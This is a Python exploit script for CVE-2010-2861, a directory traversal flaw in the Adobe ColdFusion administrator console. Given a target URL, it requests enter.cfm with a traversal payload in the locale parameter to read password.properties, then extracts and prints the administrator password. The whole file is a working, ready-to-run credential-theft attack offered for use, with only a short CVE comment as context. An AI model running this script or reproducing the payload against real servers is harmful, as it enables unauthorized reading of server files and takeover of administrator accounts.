import argparse
from log_colors import *
import sys
import requests
import lxml.html
import re

# CVE-2010-2861
# Multiple directory traversal 
# vulnerabilities in the administrator console in 
# Adobe ColdFusion 9.0.1 and earlier allow 
# remote attackers to read arbitrary files 
# via the locale parameter to 
# (1) CFIDE/administrator/settings/mappings.cfm,
# (2) logging/settings.cfm,
# (3) datasources/index.cfm,
# (4) j2eepackaging/editarchive.cfm, and 
# (5) enter.cfm in CFIDE/administrator/.
class CVE2010_2861:
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
    }

    # params:
    # url - target vulnerable url
    def __init__(self, url):
        print (LogColors.BLUE + "victim: " + url + LogColors.ENDC)
        self.url = url
        self.session = requests.Session()
    
    # exploitation
    def exploit(self):
        print (LogColors.BLUE + "exploitation admin password..." + LogColors.ENDC)
        pay = '/CFIDE/administrator/enter.cfm?locale='
        pay += '../../../../../../../../../../'
        pay += 'ColdFusion8/lib/password.properties%00en'
        url = self.url.rstrip("/").strip() + pay
        try:
            print (LogColors.YELLOW + url + "..." + LogColors.ENDC)
            r = self.session.get(
                url = url,
                headers = self.headers, timeout = 30
            )
            if r.ok:
                passwd = re.findall('\npassword=[0-9A-Z].*', r.text)
                passwd = passwd[0]
                print (LogColors.YELLOW + "administrator password: " + str(passwd) + LogColors.ENDC)
        except Exception as e:
            print (LogColors.RED + str(e) + LogColors.ENDC)
            print (LogColors.RED + "exploitation admin password failed :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    args = vars(parser.parse_args())
    url = args['url']
    cve = CVE2010_2861(url)
    cve.exploit()

